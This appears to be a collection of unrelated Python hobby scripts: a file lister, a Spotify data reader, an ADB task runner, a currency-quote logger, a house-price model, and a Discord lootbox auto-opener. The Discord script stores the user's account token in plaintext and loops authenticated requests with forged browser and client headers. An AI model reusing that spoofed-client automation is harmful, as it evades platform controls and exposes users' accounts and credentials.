    "import os, sys, math, json, fnmatch\nfrom argparse import ArgumentParser\nfrom natsort import natsorted\n\n\ndef getArguments():\n    parser = ArgumentParser(description=\"List Files In Directory With Icons\")\n    parser.add_argument(\"-p\", \"--path\", type=str, help=\"Path to the Directory\")\n    parser.add_argument(\"-f\", \"--filter\", type=str, help=\"Filter Files\")\n    parser.add_argument(\"-c\", \"--columns\", help=\"Number of Columns\")\n    parser.add_argument(\"-r\", \"--recurse\", action=\"store_true\", help=\"Recurse Files\")\n    parser.add_argument(\"-a\", \"--all\", action=\"store_true\", help=\"Show Hidden Files\")\n    parser.add_argument(\"-d\", \"--detail\", action=\"store_true\", help=\"Show File Details\")\n\n    args = parser.parse_args()\n\n    path = args.path if args.path else os.getcwd()\n    filter = args.filter if args.filter else \"*\"\n    hidden = args.all\n    recurse = args.recurse\n    detail = args.detail\n    columns = int(args.columns) if args.columns else None\n\n    return path, filter, hidden, recurse, detail, columns\n\n\ndef loadJSONFile(file):\n    with open(file, encoding=\"utf-8\") as f:\n        data = json.load(f)\n    return data\n\n\ndef loadJSONFiles():\n    scriptDir = os.path.dirname(os.path.abspath(__file__))\n    icons = loadJSONFile(os.path.join(scriptDir, \"Data\", \"Icons.json\"))\n    colors = loadJSONFile(os.path.join(scriptDir, \"Data\", \"Colors.json\"))\n    glyphs = loadJSONFile(os.path.join(scriptDir, \"Data\", \"Glyphs.json\"))\n    return icons, colors, glyphs\n\n\ndef checkWindowsTerminal():\n    if os.environ.get(\"WT_SESSION\"):\n        return True\n    return False\n\n\ndef getTerminalWidth():\n    try:\n        return os.get_terminal_size().columns\n    except OSError:\n        return 80\n\n\ndef isHidden(path):\n    return bool(os.stat(path).st_file_attributes & 0x02)\n\n\ndef listFiles(path=\".\", filter=None, hidden=False, recurse=False):\n    files = []\n\n    for root, dirs, filenames in os.walk(path):\n        iterList = filenames + dirs\n\n        for itemName in iterList:\n            itemMatch = fnmatch.fnmatch(itemName, filter)\n\n            if itemMatch:\n                itemPath = os.path.join(root, itemName)\n                itemHidden = isHidden(itemPath)\n                itemJunction = os.path.isjunction(itemPath)\n\n                if hidden or not itemHidden and not itemJunction:\n                    itemType = \"Directories\" if os.path.isdir(itemPath) else \"Files\"\n                    itemIcon, itemColor = getIconColor(itemName, itemType, itemJunction)\n                    itemInfo = {\n                        \"FilePath\": itemPath,\n                        \"FileBase\": root,\n                        \"Filename\": itemName,\n                        \"FileHidden\": itemHidden,\n                        \"Type\": itemType,\n                        \"Icon\": itemIcon,\n                        \"Color\": itemColor,\n                    }\n\n                    files.append(itemInfo)\n        if not recurse:\n            break\n\n    return natsorted(files, key=lambda x: (x[\"Type\"], x[\"FilePath\"].lower()))\n\n\ndef getIconColor(filename, itemType, junction=False):\n    filename = filename.lower()\n    _, ext = os.path.splitext(filename)\n\n    if filename in icons[itemType][\"WellKnown\"]:\n        itemIcon = icons[itemType][\"WellKnown\"][filename]\n    elif ext in icons[itemType]:\n        itemIcon = icons[itemType][ext]\n    else:\n        itemIcon = icons[itemType][\"\"]\n\n    if filename in colors[itemType][\"WellKnown\"]:\n        itemColor = convertHexToSeq(colors[itemType][\"WellKnown\"][filename])\n    elif ext in colors[itemType]:\n        itemColor = convertHexToSeq(colors[itemType][ext])\n    else:\n        itemColor = \"\"\n\n    if junction:\n        itemIcon = icons[\"Junction\"][\"\"]\n        itemColor = convertHexToSeq(colors[\"Junction\"][\"\"])\n\n    return itemIcon, itemColor\n\n\ndef convertHexToSeq(hexColor):\n    red = int(hexColor[0:2], 16)\n    green = int(hexColor[2:4], 16)\n    blue = int(hexColor[4:6], 16)\n    return f\"\\033[38;2;{red};{green};{blue}m\"\n\n\ndef getMaxRowLen(filenames, numCols, padding=0, force=False):\n    terminalWidth = getTerminalWidth()\n    numRows = math.ceil(len(filenames) / numCols)\n    cols = [[] for _ in range(numCols)]\n\n    for i in range(len(filenames)):\n        index = i // numRows\n        cols[index].append(len(filenames[i]))\n\n    maxColLen = [max(col) for col in cols if col != []]\n    avgColLen = [int((sum(col) / len(col)) * 2) for col in cols if col != []]\n\n    maxSumRowLen = sum(maxColLen) + padding * (numCols - 1) + 3\n    maxAvgRowLen = sum(avgColLen) + padding * (numCols - 1) + 3\n\n    if force:\n        if maxAvgRowLen > terminalWidth:\n            return maxAvgRowLen, avgColLen\n    else:\n        if maxSumRowLen <= terminalWidth:\n            return maxSumRowLen, maxColLen\n        elif maxAvgRowLen <= terminalWidth:\n            return maxAvgRowLen, avgColLen\n\n    return maxSumRowLen, maxColLen\n\n\ndef getMaxColumns(filenames, padding=0):\n    terminalWidth = getTerminalWidth()\n    avgColLen = int(sum(len(filename) for filename in filenames) / len(filenames))\n\n    low = 2\n    hi",
    "from pystyle import *\nimport os\nimport json\nimport requests\nfrom colorama import *\nimport time\n\nos.system('clear' if os.name == 'posix' else 'cls')\n\nintro = \"\"\"\n\n \u2588\u2588 \u2584\u2588\u2580  \u2588\u2588\u2593     \u2588\u2588\u2593 \u2588\u2588\u2588\u2584    \u2588 \u2584\u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2593     \u2592\u2588\u2588\u2588\u2588\u2588   \u2584\u2588\u2588\u2588\u2588 \n \u2588\u2588\u2584\u2588\u2592  \u2593\u2588\u2588\u2592   \u2592\u2593\u2588\u2588\u2592 \u2588\u2588 \u2580\u2588   \u2588 \u2593  \u2588\u2588\u2592 \u2593\u2592    \u2592\u2588\u2588\u2592  \u2588\u2588\u2592 \u2588\u2588\u2592 \u2580\u2588\n\u2593\u2588\u2588\u2588\u2584\u2591  \u2592\u2588\u2588\u2591   \u2592\u2592\u2588\u2588\u2592\u2593\u2588\u2588  \u2580\u2588 \u2588\u2588\u2592\u2592 \u2593\u2588\u2588\u2591 \u2592\u2591    \u2592\u2588\u2588\u2591  \u2588\u2588\u2592\u2592\u2588\u2588\u2591\u2584\u2584\u2584      ds: .klintxxxgod\n\u2593\u2588\u2588 \u2588\u2584  \u2592\u2588\u2588\u2591   \u2591\u2591\u2588\u2588\u2591\u2593\u2588\u2588\u2592  \u2590\u258c\u2588\u2588\u2592\u2591 \u2593\u2588\u2588\u2593 \u2591     \u2592\u2588\u2588   \u2588\u2588\u2591\u2591\u2593\u2588  \u2588\u2588      tg: @klintxxxgod \n\u2592\u2588\u2588\u2592 \u2588\u2584\u2592\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2588\u2588\u2591\u2592\u2588\u2588\u2591   \u2593\u2588\u2588\u2591  \u2592\u2588\u2588\u2592 \u2591     \u2591 \u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2580\u2592\n\u2592 \u2592\u2592 \u2593\u2592\u2591\u2591 \u2592\u2591\u2593   \u2591\u2593  \u2591 \u2592\u2591   \u2592 \u2592   \u2592 \u2591\u2591       \u2591 \u2592\u2591\u2592\u2591\u2592\u2591 \u2591\u2592   \u2592 \n\u2591 \u2591\u2592 \u2592\u2591\u2591\u2591 \u2591 \u2592  \u2591 \u2592 \u2591\u2591 \u2591\u2591   \u2591 \u2592\u2591    \u2591          \u2591 \u2592 \u2592\u2591  \u2591   \u2591 \n\u2591 \u2591\u2591 \u2591    \u2591 \u2591  \u2591 \u2592 \u2591   \u2591   \u2591 \u2591   \u2591          \u2591 \u2591 \u2591 \u2592   \u2591   \u2591 \n\u2591  \u2591   \u2591    \u2591    \u2591           \u2591                  \u2591 \u2591       \u2591 \n\n                > Press Enter                                         \n\n\"\"\"\n\nAnime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.035, enter=True)\n\n\nprint(f\"\"\"{Fore.RED}\n\n \u2588\u2588 \u2584\u2588\u2580  \u2588\u2588\u2593     \u2588\u2588\u2593 \u2588\u2588\u2588\u2584    \u2588 \u2584\u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2593     \u2592\u2588\u2588\u2588\u2588\u2588   \u2584\u2588\u2588\u2588\u2588 \n \u2588\u2588\u2584\u2588\u2592  \u2593\u2588\u2588\u2592   \u2592\u2593\u2588\u2588\u2592 \u2588\u2588 \u2580\u2588   \u2588 \u2593  \u2588\u2588\u2592 \u2593\u2592    \u2592\u2588\u2588\u2592  \u2588\u2588\u2592 \u2588\u2588\u2592 \u2580\u2588\n\u2593\u2588\u2588\u2588\u2584\u2591  \u2592\u2588\u2588\u2591   \u2592\u2592\u2588\u2588\u2592\u2593\u2588\u2588  \u2580\u2588 \u2588\u2588\u2592\u2592 \u2593\u2588\u2588\u2591 \u2592\u2591    \u2592\u2588\u2588\u2591  \u2588\u2588\u2592\u2592\u2588\u2588\u2591\u2584\u2584\u2584      ds: .klintxxxgod\n\u2593\u2588\u2588 \u2588\u2584  \u2592\u2588\u2588\u2591   \u2591\u2591\u2588\u2588\u2591\u2593\u2588\u2588\u2592  \u2590\u258c\u2588\u2588\u2592\u2591 \u2593\u2588\u2588\u2593 \u2591     \u2592\u2588\u2588   \u2588\u2588\u2591\u2591\u2593\u2588  \u2588\u2588      tg: @klintxxxgod \n\u2592\u2588\u2588\u2592 \u2588\u2584\u2592\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2588\u2588\u2591\u2592\u2588\u2588\u2591   \u2593\u2588\u2588\u2591  \u2592\u2588\u2588\u2592 \u2591     \u2591 \u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2592\u2593\u2588\u2588\u2588\u2580\u2592\n\u2592 \u2592\u2592 \u2593\u2592\u2591\u2591 \u2592\u2591\u2593   \u2591\u2593  \u2591 \u2592\u2591   \u2592 \u2592   \u2592 \u2591\u2591       \u2591 \u2592\u2591\u2592\u2591\u2592\u2591 \u2591\u2592   \u2592 \n\u2591 \u2591\u2592 \u2592\u2591\u2591\u2591 \u2591 \u2592  \u2591 \u2592 \u2591\u2591 \u2591\u2591   \u2591 \u2592\u2591    \u2591          \u2591 \u2592 \u2592\u2591  \u2591   \u2591 \n\u2591 \u2591\u2591 \u2591    \u2591 \u2591  \u2591 \u2592 \u2591   \u2591   \u2591 \u2591   \u2591          \u2591 \u2591 \u2591 \u2592   \u2591   \u2591 \n\u2591  \u2591   \u2591    \u2591    \u2591           \u2591                  \u2591 \u2591       \u2591 \n\n\n\"\"\")\n\ntime.sleep(1)\n\n\nwhile True:\n    \n    print(\"\\nWhich option do you want to choose: \", Colors.red)\n    print(\"\\n1. Enter Token\", Colors.red)\n    print(\"\\n2. Start\", Colors.red)\n    print(\"\\n3. Close\", Colors.red)\n    print(\"\\nMake your selection: \", Colors.red, end=\"\")\n    choice = input()\n\n    if choice == \"1\":\n        if not os.path.exists(\"config.json\"):    \n            with open(\"config.json\", \"w\") as file:\n                        json.dump({}, file)\n        os.system(\"cls || clear\")\n        token = input(\"Enter your token: \")\n        data = {\"token\": token}\n        with open(\"config.json\", \"w\") as file:\n            json.dump(data, file)\n        print(\"Token saved successfully.\")\n    elif choice == \"2\":\n        \n        url = 'https://discord.com/api/v9/users/@me/lootboxes/open'\n        with open(\"config.json\", \"r\") as arquivo:\n            token = json.load(arquivo)\n\n        headers = {\n            'Authorization': token['token'],\n            'Content-Type': 'application/json',\n            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',\n            'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIzLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI4MDQ3MiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='\n        }\n\n        tentativa_atual = 1\n\n        while True:\n            res = requests.post(url, headers=headers)\n\n            if res.status_code == 200:\n                print(f\"{Fore.WHITE}[{Fore.GREEN}{tentativa_atual}{Fore.WHITE}] {Fore.GREEN} New item collected!\", Colors.red)\n            elif res.status_code == 429:\n                print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] {Fore.RED}You are collecting items very quickly! Wait a while before trying again.', Colors.red)\n            else:\n                print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] {Fore.RED}An error occurred while trying {tentativa_atual}:', Colors.red)\n\n            tentativa_atual += 1\n\n            time.sleep(3) \n\n    elif choice == \"3\":\n        Write.Print(\"\\nExiting the program...\", Colors.red)\n        break\n\n    else:\n        Write.Print(\"\\nYou have entered invalid. Please try again.\", Colors.red)\n",
    "# Project conception 03/31/2024\n# Project started 04/02/2024\n\nimport pandas as pd\nimport time\n\n# Read the CSV file\ndf = pd.read_csv(\"spotify_songs.csv\")\n\n# Convert each column into an array\ntrack_id = df['track_id'].values\ntrack_name = df['track_name'].values\ntrack_artist = df['track_artist'].values\ntrack_popularity = df['track_popularity'].values\ntrack_album_id = df['track_album_id'].values\ntrack_album_name = df['track_album_name'].values\ntrack_album_release_date = df['track_album_release_date'].values\nplaylist_name = df['playlist_name'].values\nplaylist_id = df['playlist_id'].values\nplaylist_genre = df['playlist_genre'].values\nplaylist_subgenre = df['playlist_subgenre'].values\ndanceability = df['danceability'].values\nenergy = df['energy'].values\nkey = df['key'].values\nloudness = df['loudness'].values\nmode = df['mode'].values\nspeechiness = df['speechiness'].values\nacousticness = df['acousticness'].values\ninstrumentalness = df['instrumentalness'].values\nliveness = df['liveness'].values\nvalence = df['valence'].values\ntempo = df['tempo'].values\nduration_ms = df['duration_ms'].values\n\n\ndef print_info(song_index):\n    print(\"Track ID:\", track_id[song_index])\n    print(\"Track name:\", track_name[song_index])\n    print(\"Track artist:\", track_artist[song_index])\n    print(\"Track popularity:\", track_popularity[song_index])\n    print(\"Track album ID:\", track_album_id[song_index])\n    print(\"Track album name:\", track_album_name[song_index])\n    print(\"Track album release date:\", track_album_release_date[song_index])\n    print(\"Playlist name:\", playlist_name[song_index])\n    print(\"Playlist ID:\", playlist_id[song_index])\n    print(\"Playlist genre:\", playlist_genre[song_index])\n    print(\"Playlist subgenre:\", playlist_subgenre[song_index])\n    print(\"Danceability:\", danceability[song_index])\n    print(\"Energy:\", energy[song_index])\n    print(\"Key:\", key[song_index])\n    print(\"Loudness:\", loudness[song_index])\n    print(\"Mode:\", mode[song_index])\n    print(\"Speechiness:\", speechiness[song_index])\n    print(\"Acousticness:\", acousticness[song_index])\n    print(\"Instrumentalness:\", instrumentalness[song_index])\n    print(\"Liveness:\", liveness[song_index])\n    print(\"Valence:\", valence[song_index])\n    print(\"Tempo:\", tempo[song_index])\n    print(\"Duration (ms):\", duration_ms[song_index])\n\n\nprint_info(6236)\n\n\ndef similar_song(song_index):\n    x = 0\n\n    print(\"Track ID:\")\n    for element in track_id:\n        x += 1\n        # print(element)\n\n    print(\"\\nTrack Name:\")\n    for element in track_name:\n        x += 1\n        # print(element)\n\n    print(\"\\nTrack Artist:\")\n    for element in track_artist:\n        x += 1\n        # print(element)\n\n    print(\"\\nTrack Popularity:\")\n    for element in track_popularity:\n        x += 1\n        # print(element)\n\n    print(\"\\nTrack Album ID:\")\n    for element in track_album_id:\n        x += 1\n        # print(element)\n\n    print(\"\\nTrack Album Name:\")\n    for element in track_album_name:\n        x += 1\n        # print(element)\n\n    print(\"\\nTrack Album Release Date:\")\n    for element in track_album_release_date:\n        x += 1\n        # print(element)\n\n    print(\"\\nPlaylist Name:\")\n    for element in playlist_name:\n        x += 1\n        # print(element)\n\n    print(\"\\nPlaylist ID:\")\n    for element in playlist_id:\n        x += 1\n        # print(element)\n\n    print(\"\\nPlaylist Genre:\")\n    for element in playlist_genre:\n        x += 1\n        # print(element)\n\n    print(\"\\nPlaylist Subgenre:\")\n    for element in playlist_subgenre:\n        x += 1\n        # print(element)\n\n    print(\"\\nDanceability:\")\n    for element in danceability:\n        x += 1\n        # print(element)\n\n    print(\"\\nEnergy:\")\n    for element in energy:\n        x += 1\n        # print(element)\n\n    print(\"\\nKey:\")\n    for element in key:\n        x += 1\n        # print(element)\n\n    print(\"\\nLoudness:\")\n    for element in loudness:\n        x += 1\n        # print(element)\n\n    print(\"\\nMode:\")\n    for element in mode:\n        x += 1\n        # print(element)\n\n    print(\"\\nSpeechiness:\")\n    for element in speechiness:\n        x += 1\n        # print(element)\n\n    print(\"\\nAcousticness:\")\n    for element in acousticness:\n        x += 1\n        # print(element)\n\n    print(\"\\nInstrumentalness:\")\n    for element in instrumentalness:\n        x += 1\n        # print(element)\n\n    print(\"\\nLiveness:\")\n    for element in liveness:\n        x += 1\n        # print(element)\n\n    print(\"\\nValence:\")\n    for element in valence:\n        x += 1\n        # print(element)\n\n    print(\"\\nTempo:\")\n    for element in tempo:\n        x += 1\n        # print(element)\n\n    print(\"\\nDuration (ms):\")\n    for element in duration_ms:\n        x += 1\n        # print(element)\n\n\nstart_time = time.time()\nsimilar_song(6236)\nend_time = time.time()\nelapsed_time = end_time - start_time\nprint(\"Scanned all arrays in:\", elapsed_time, \"seconds\")\n",
    "from typing import List, Tuple, Union\nfrom maa.define import RectType\nfrom maa.library import Library\nfrom maa.resource import Resource\nfrom maa.controller import AdbController\nfrom maa.instance import Instance\nfrom maa.toolkit import Toolkit\n\nfrom maa.custom_recognizer import CustomRecognizer\nfrom maa.custom_action import CustomAction\n\nimport os\nimport asyncio\nimport time\nimport json\n\nasync def ChooseAdbDevices(devices_list: list) -> AdbController:\n    print(\"Adb \u8bbe\u5907\u5217\u8868\")\n    for i in range(len(devices_list)):\n        print(f\"{i+1}. {devices_list[i]}\")\n\n    device_index=-1\n    print(\"\u8bf7\u8f93\u5165\u7f16\u53f7\uff1b\")\n\n    while(device_index not in range(1,len(devices_list)+1)):\n        while(True):\n            try:\n                device_index=int(input())\n            except:\n                print(\"\u8f93\u5165\u6709\u8bef\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\")\n            else:\n                break\n\n        if device_index not in range(1,len(devices_list)+1):\n            print(\"\u8f93\u5165\u8303\u56f4\u6709\u8bef\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\")\n\n    print(f\"\u6210\u529f\u9009\u62e9\u7b2c{device_index}\u4e2a\u8bbe\u5907\")\n    \n    return AdbController(\n        adb_path=devices_list[device_index-1].adb_path,\n        address=devices_list[device_index-1].address,\n    )\n\nasync def LoadJson() -> list:\n    with open(\"./resource/interface.json\",\"r\",encoding='utf-8') as f:\n        Interface=json.load(f)\n        \n    return Interface\n\nasync def GetTaskList(Inter_dict: list) -> list:\n    Task_list=dict()\n    for tasks in Inter_dict['task']:\n        Task_list[tasks['name']]=tasks['entry']\n\n    return Task_list\n\nasync def ChooseTask(Task_dict: dict) -> str :\n    task_list=list(Task_dict.keys())\n\n    print(\"\u4efb\u52a1\u5217\u8868\")\n    for i in range(len(task_list)):\n        print(f\"{i+1}. {task_list[i]}\")\n\n    task_index=-1\n    print(\"\u8bf7\u8f93\u5165\u7f16\u53f7\uff1b\")\n\n    while(task_index not in range(1,len(task_list)+1)):\n        while(True):\n            try:\n                task_index=int(input())\n            except:\n                print(\"\u8f93\u5165\u6709\u8bef\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\")\n            else:\n                break\n\n        if task_index not in range(1,len(task_list)+1):\n            print(\"\u8f93\u5165\u8303\u56f4\u6709\u8bef\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\")\n\n    print(f\"\u6210\u529f\u9009\u62e9\u7b2c{task_index}\u4e2a\u4efb\u52a1: {task_list[task_index-1]}\")\n\n    return Task_dict[task_list[task_index-1]]\n\nasync def main():\n\n    # \u521d\u59cb\u5316\u8d44\u6e90\n    print(\"\u6b63\u5728\u521d\u59cb\u5316...\")\n\n    version = Library.open(\"bin\")\n    print(f\"MaaFw Version: {version}\")\n\n    Toolkit.init_config()\n\n    resource = Resource()\n    await resource.load(\"resource\")\n\n    device_list = await Toolkit.adb_devices()\n    if not device_list:\n        print(\"No ADB device found.\")\n        exit()\n\n    controller = await ChooseAdbDevices(device_list)\n    await controller.connect()\n\n    maa_inst = Instance()\n    maa_inst.bind(resource, controller)\n\n    if not maa_inst.inited:\n        print(\"Failed to init MAA.\")\n        exit()\n    \n    interface = await LoadJson()\n    task_dict = await GetTaskList(interface)\n    print(\"\u521d\u59cb\u5316\u5b8c\u6bd5\")\n    # time.sleep(1)\n    os.system(\"cls\")\n\n    # \u9009\u62e9\u4efb\u52a1\n    task = await ChooseTask(task_dict)\n    await maa_inst.run_task(task)\n    \n    \n   \n    \n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n",
    "# importando a biblioteca para chamar a api\nimport requests\n#importando a biblioteca para usar as informa\u00e7\u00f5es da biblioteca\nimport json\n\n# importando a biblioteca datetime para armazenar o dia e a hora da cota\u00e7\u00e3o\nfrom datetime import datetime\n\n# importando a bilbioteca random para pegar aleatoriamento o valor do dicion\u00e1rio\nimport random as rd\n\n# importando biblioteca para adicionar a cada 30 seg uma informa\u00e7\u00e3o na planilha\nfrom time import sleep\n\n# criando o arquivo cota\u00e7\u00e3o na pasta moedas\ntry:\n    with open('D:/Python-Projetos/Pessoal/moedas_python/moedas/cotacao.csv', 'x') as base:\n        base = base.write('moeda,valor,data,hora\\n')\n\nexcept FileExistsError:\n    pass\n\n# criando o dicion\u00e1rio para poder utilizar qual moeda eu quiser\nmoedas = {\n    'Dirham dos Emirados': ['AED-BRL', 'AEDBRL'],\n    'Peso Argentino': ['ARS-BRL', 'ARSBRL'],\n    'D\u00f3lar Australiano': ['AUD-BRL', 'AUDBRL'],\n    'Boliviano': ['BOB-BRL', 'BOBBRL'],\n    'Bitcoin': ['BTC-BRL', 'BTCBRL'],\n    'D\u00f3lar Canadense': ['CAD-BRL', 'CADBRL'],\n    'Franco Su\u00ed\u00e7o': ['CHF-BRL', 'CHFBRL'],\n    'Peso Chileno': ['CLP-BRL', 'CLPBRL'],\n    'Yuan Chin\u00eas': ['CNY-BRL', 'CNYBRL'],\n    'Peso Colombiano': ['COP-BRL', 'COPBRL'],\n    'Coroa Dinamarquesa': ['DKK-BRL', 'DKKBRL'],\n    'Dogecoin': ['DOGE-BRL', 'DOGEBRL'],\n    'Ethereum': ['ETH-BRL', 'ETHBRL'],\n    'Euro': ['EUR-BRL', 'EURBRL'],\n    'Libra Esterlina': ['GBP-BRL', 'GBPBRL'],\n    'D\u00f3lar de Hong Kong': ['HKD-BRL', 'HKDBRL'],\n    'Novo Shekel Israelense': ['ILS-BRL', 'ILSBRL'],\n    'R\u00fapia Indiana': ['INR-BRL', 'INRBRL'],\n    'Iene Japon\u00eas': ['JPY-BRL', 'JPYBRL'],\n    'Litecoin': ['LTC-BRL', 'LTCBRL'],\n    'Peso Mexicano': ['MXN-BRL', 'MXNBRL'],\n    'Coroa Norueguesa': ['NOK-BRL', 'NOKBRL'],\n    'D\u00f3lar Neozeland\u00eas': ['NZD-BRL', 'NZDBRL'],\n    'Sol do Peru': ['PEN-BRL', 'PENBRL'],\n    'Zl\u00f3ti Polon\u00eas': ['PLN-BRL', 'PLNBRL'],\n    'Guarani Paraguaio': ['PYG-BRL', 'PYGBRL'],\n    'Rublo Russo': ['RUB-BRL', 'RUBBRL'],\n    'Riyal Saudita': ['SAR-BRL', 'SARBRL'],\n    'Coroa Sueca': ['SEK-BRL', 'SEKBRL'],\n    'D\u00f3lar de Cingapura': ['SGD-BRL', 'SGDBRL'],\n    'Baht Tailand\u00eas': ['THB-BRL', 'THBBRL'],\n    'Nova Lira Turca': ['TRY-BRL', 'TRYBRL'],\n    'D\u00f3lar Taiuan\u00eas': ['TWD-BRL', 'TWDBRL'],\n    'D\u00f3lar Americano': ['USD-BRL', 'USDBRL'],\n    'Peso Uruguaio': ['UYU-BRL', 'UYUBRL'],\n    'Bol\u00edvar Venezuelano': ['VEF-BRL', 'VEFBRL'],\n    'XRP': ['XRP-BRL', 'XRPBRL'],\n    'Rand Sul-Africano': ['ZAR-BRL', 'ZARBRL']\n}\n\nprint(f'{' CONVERSOR DE MOEDA ':-^30}')\nprint('')\n\n# mostrando as op\u00e7\u00f5es de moedas no nosso dicion\u00e1rio para o nosso usu\u00e1rio\nfor moeda in moedas.keys():\n    print(f'Digite {moeda} para trazer o valor dela em Real')\n\n\n# repetindo para aceitar apenas quando o usu\u00e1rio digitar uma moeda que est\u00e1 em nosso dicion\u00e1rio\n\nwhile True:\n    converter = str(input('\\nEscolha uma das op\u00e7\u00f5es acima (Digite aleat\u00f3rio para caso deseje que seja aleat\u00f3rio): ')).strip().title()\n    \n    if converter ==  'Aleat\u00f3rio':\n        # escolhendo aleat\u00f3riamente entre a lista de itens\n        converter = rd.choice(list(moedas.keys()))\n\n    elif converter not in moedas:\n        continue\n\n    break\n\n\n#repetindo para adicionar a nossa planilha\nvezes_adicionar = int(input('Digite o n\u00famero de vezes que deseja adicionar: (intervalo de 30s) '))\n\nfor i in range(vezes_adicionar):\n\n    converter = rd.choice(list(moedas.keys()))\n\n    # chamando a api de acordo com a moeda escolhida\n    atual = requests.get(f'https://economia.awesomeapi.com.br/last/{moedas[converter][0]}')\n\n    # convertendo em json para poder buscar a informa\u00e7\u00e3o que desejamos\n    atual = atual.json()\n\n    # buscando o BID da moeda escolhida\n    # BID \u00e9 a convers\u00e3o atual da moeda\n    valor_atual = atual[moedas[converter][1]]['bid']\n\n    # pegando a data atual e formatando ela\n    data_agora = datetime.now()\n    data_atual = data_agora.strftime('%d/%m/%Y')\n    hora_atual = data_agora.strftime('%H:%M:%S')\n\n\n\n    # armazenando a data atual no nosso arquivo txt\n    with open('D:/Python-Projetos/Pessoal/moedas_python/moedas/cotacao.csv', 'a') as adicionar:\n        adicionar = adicionar.write(f'{converter},{float(valor_atual):.2f},{data_atual},{hora_atual}\\n')\n\n\n    # mostrando para o usu\u00e1rio o valor armazenado\n\n    print(f'O valor armazenado na nossa tabela foi: \\nA moeda {converter} est\u00e1 valendo R${float(valor_atual):.2f} no dia e hora {data_atual}')\n\n    sleep(5)",
    "import pandas as pd\nimport matplotlib.pyplot as plt\nimport seaborn as sns\nfrom sklearn.preprocessing import OneHotEncoder\nfrom sklearn.metrics import mean_absolute_error\nfrom sklearn.model_selection import train_test_split\nfrom sklearn import svm\nfrom sklearn.svm import SVR\nfrom sklearn.metrics import mean_absolute_percentage_error\nfrom sklearn.ensemble import RandomForestRegressor\nfrom sklearn.linear_model import LinearRegression\nfrom catboost import CatBoostRegressor\nfrom sklearn.metrics import r2_score\n\nurl = \"C:\\\\Users\\\\denis\\\\Desktop\\\\ML Projects\\\\House-Price-Prediction\\\\HousePricePrediction.xlsx\"\ndata = pd.read_excel(url)\n# print(data.head())\n# print(data.shape)\n# print(data.dtypes)\n# print(data.dtypes.unique()) # There are 3 types: int, float and object only.\n\n\n# -----Preprocessing, cleaning, EDA, and One Hot Encoder-----\n\n# Each of these list out all of the columns and assign T or F in each category (int, float, object)\n# obj[obj] for e.g., will list out all of the columns that are assigned T in each category (int, float, object)\nobj = (data.dtypes == 'object')\ninteger = (data.dtypes == 'int')\ndecimal = (data.dtypes == 'float')\n\n# Lists out all the columns that are assigned True in each category (int, float, object)\n# Grabs all the columns assigned as True for the attribute 'object' (obj[obj], integer[integer], decimal[decimal]),\n# -index them and put them in a list.\nobj_col = list(obj[obj].index)\nint_col = list(integer[integer].index)\nfloat_col = list(decimal[decimal].index)\n# print(obj_col) # 4 cols\n# print(int_col) # 6 cols\n# print(float_col) # 3 cols\n\n# plt.figure(figsize = (12, 6))\n# # corr() is used to find the pairwise correlation of all columns in the Pandas Dataframe \n# sns.heatmap(data.corr(), cmap = 'BrBG', fmt = '.2f', linewidths = 2, annot = True)\n# plt.show()\n\n\n# Analyzing different categorical features\n# unq_val = []\n# Determining how many unique values are in each object column\n# pd.size counts the total number of values both valid and NaN. pd.count counts the total number of values of only valid entries.\n# for col in obj_col:\n#     unq_val.append(data[col].unique().size)\n# plt.figure(figsize = (10, 6))\n# plt.title('No. Unique values of Categorical Features')\n# plt.xticks(rotation = 90)\n# sns.barplot(x = obj_col, y = unq_val)\n# plt.show()\n# MSZoning has 6 unique values\n# LotConfig has 5 unique values\n# BldgType has 5 unique values\n# Exterior1st has 16 unique values\n\n# Determining how many counts of each unique value in each object column\n# plt.figure(figsize = (18, 36))\n# plt.title('Categorical Features: Distribution')\n# plt.xticks(rotation = 90)\n\n# i = 1\n# for col in obj_col:\n#     y = data[col].value_counts()\n#     plt.subplot(1, 4, i)\n#     plt.xticks(rotation = 90)\n#     sns.barplot(x = list(y.index), y = y)\n#     i += 1\n# plt.show()\n\n\n# Cleaning data\ndata.drop(['Id'], axis = 1, inplace = True) # Dropping Id column\n# Fills the missing entries in SalePrice column with the average of the remaining entries.\ndata['SalePrice'] = data['SalePrice'].fillna(data['SalePrice'].mean())\nclean_data = data.dropna() # Drop records with null values\n# print(clean_data.isnull().sum()) # There are no entries with null values\n\n\n# One Hot encoder\nobj_clean = (clean_data.dtypes == 'object')\n# Grabs all the columns assigned as True for the attribute 'object' (obj_clean[obj_clean]), index them and put it in a list, from the-\n# -cleaned 